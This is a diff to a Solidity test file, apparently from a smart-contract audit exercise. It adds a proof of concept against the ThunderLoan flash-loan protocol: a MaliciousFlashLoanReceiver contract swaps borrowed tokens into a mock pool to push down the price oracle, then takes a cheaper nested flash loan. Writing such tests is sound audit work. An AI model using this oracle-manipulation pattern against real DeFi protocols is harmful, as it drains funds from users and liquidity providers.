@@ -10,6 +10,8 @@ import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
 import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
 import {ERC20Mock} from "../mocks/ERC20mock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
+import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 contract ThunderLoanTest is BaseTest {
     uint256 constant AMOUNT = 10e18;
@@ -202,16 +204,80 @@ contract ThunderLoanTest is BaseTest {
         // 4. We will take 2 flashloanz :
         //             1) To nuke the price of the weh/tokenB
         //            2) to show that we need top pay less fee to the pool
+
+        MaliciousFlashLoanReceiver malicousContract = new MaliciousFlashLoanReceiver(
+                thunderLoan,
+                tswapPool,
+                address(thunderLoan.getAssetFromToken(IERC20(address(tokenB))))
+            );
+
+        vm.startPrank(liquidityProvider);
+        tokenB.mint(address(malicousContract), 100e18);
+        thunderLoan.flashloan(
+            address(malicousContract),
+            IERC20(address(tokenB)),
+            50e18,
+            ""
+        );
+        vm.stopPrank();
+
+        uint256 attackFee = malicousContract.feeOne() +
+            malicousContract.feeTwo();
+
+        console.log("Attack Fee: ", attackFee);
+        assert(attackFee < normalFeeCost);
     }
 }
 
-
-contract MaliciousFlashLoanReceiver {
+contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
     ThunderLoan thunderLoan;
-    ERC20Mock tokenB;
-    
-    constructor(ThunderLoan _thunderLoan, ERC20Mock _tokenB) {
+    address repayAddress;
+    BuffMockTSwap tswapPool;
+    bool attacked;
+    uint256 public feeOne;
+    uint256 public feeTwo;
+
+    constructor(
+        ThunderLoan _thunderLoan,
+        address _tswapPool,
+        address _repayAddress
+    ) {
         thunderLoan = _thunderLoan;
-        tokenB = _tokenB;
+        tswapPool = BuffMockTSwap(_tswapPool);
+        repayAddress = _repayAddress;
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address /* initiator */,
+        bytes calldata /* params */
+    ) external returns (bool) {
+        if (!attacked) {
+            feeOne = fee;
+            attacked = true;
+            uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(
+                50e18,
+                100e18,
+                100e18
+            );
+            IERC20(token).approve(address(tswapPool), 50e18);
+            tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(
+                50e18,
+                wethBought,
+                block.timestamp
+            );
+            thunderLoan.flashloan(address(this), IERC20(token), 50e18, "");
+            // repay
+            // IERC20(token).approve(address(thunderLoan), amount + fee);
+            // thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        } else {
+            feeTwo = fee;
+            IERC20(token).approve(address(thunderLoan), amount + fee);
+            thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
+        }
     }
 }
